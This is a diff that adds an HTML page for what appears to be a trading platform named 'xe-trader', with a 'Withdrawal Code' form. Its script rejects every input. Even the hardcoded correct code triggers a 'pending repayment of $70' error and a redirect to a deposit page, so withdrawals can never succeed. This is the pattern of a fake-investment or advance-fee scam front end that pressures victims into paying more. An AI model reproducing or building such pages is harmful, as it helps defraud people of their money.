@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>code</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link rel="stylesheet" href="main2.css" />
+    <script src="https://kit.fontawesome.com/649aa51483.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />
+
+
+</head>
+
+<body>
+    <section class="allback">
+        <nav class="navbar">
+            <div class="container-nav">
+                <div class="logo">
+                    <a href="getcode.html">
+                        <img src="./asset/LOGOO.jpg" alt="">
+                        <h3>xe-trader</h3>
+                    </a>
+                </div>
+
+                <div class="main-menu">
+                    <ul>
+
+                        <li>
+                            <a class="btn" href="withdraw.html">
+                                <i class="fa-solid fa-user"></i>Back
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+
+                <!--Hamburger-->
+
+                <button id="hamburger-button" class="hamburger-button">
+                    <div class="hamburger-line"></div>
+                    <div class="hamburger-line"></div>
+                    <div class="hamburger-line"></div>
+                </button>
+                <div class="mobile-menu">
+                    <ul>
+
+                        <li>
+                            <a href="#">
+                                <!-- <i class="fa-solid fa-user"></i>SignUP -->
+                            </a>
+                        </li>
+                        <li>
+                            <a class="btn btn-light" href="withdraw.html">
+                                <i class="fa-solid fa-user"></i>Back
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+
+        <main>
+            <div class="container">
+                <div class="contact-left">
+
+
+                    <form action="" method="">
+
+                        <p class="text-md">You have a pending repayment of $70</p>
+                        <div class="contact-left-title">
+                            <h2 class="text-sm">Withdrawal Code</h2>
+                            <hr>
+                        </div>
+
+                        <input type="text" name="code" id="code" placeholder="Confirmation code"
+                            class="contact-input block" required>
+                        <button type="submit" id="btn" class="btn text-md">
+                            <i class="fa-solid fa-circle-minus"></i> Withdraw
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </main>
+
+
+        <!--Footer-->
+        <footer class="footer bg-light">
+            <div class="container-footer">
+            </div>
+        </footer>
+    </section>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const code = document.getElementById("code");
+        const btn = document.getElementById("btn");
+        // let address = "saleemtrd@gmail.com";
+        let setCode = 667503;
+
+
+        btn.addEventListener("click", (e) => {
+            e.preventDefault();
+
+            if (code.value == setCode) {
+                swal("", "You have a pending repayment of $70 uncleared!", "error");
+                setTimeout(function () {
+                    try {
+                        window.location.href = "deposit.html";
+                    } catch (error) {
+                        console.error("An error occurred:", error);
+                        // Handle the error here, e.g., display an error message to the user
+                    }
+                }, 2000);
+            } else if (code.value == "") {
+                swal("", "Kindly request for Transaction code!", "error");
+
+            } else if (code.value != "") {
+                swal("", "Not a valid Transaction Code!", "error");
+
+            } else {
+                swal("", "Kindly complete your repayment Deposit!", "error");
+            }
+            code.value = "";
+
+
+        });
+
+        // document.getElementById("address").innerHTML = sessionStorage.getItem("txtValue");
+        // document.getElementById("data1").innerHTML = localStorage.getItem("txtValue1");
+        // document.getElementById("data2").innerHTML = localStorage.getItem("txtValue2");
+        // document.getElementById("data3").innerHTML = localStorage.getItem("txtValue3");
+
+
+
+    </script>
+    <script src="main.js"></script>
+</body>
+
+</html>
